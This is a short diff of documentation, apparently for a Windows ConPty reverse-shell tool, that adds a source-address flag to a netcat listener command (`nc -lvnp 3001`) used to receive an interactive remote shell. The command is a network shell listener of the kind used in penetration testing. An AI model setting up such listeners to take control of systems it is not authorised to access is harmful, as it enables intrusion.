@@ -52,7 +52,7 @@ The introduction of the Pseudo Console (ConPty) in Windows has improved so much 
 Server Side:
 
 ```
-stty raw -echo; (stty size; cat) | nc -lvnp 3001
+stty raw -echo; (stty size; cat) | nc -lvnp 3001 -s ip
 ```
 
 Client Side:
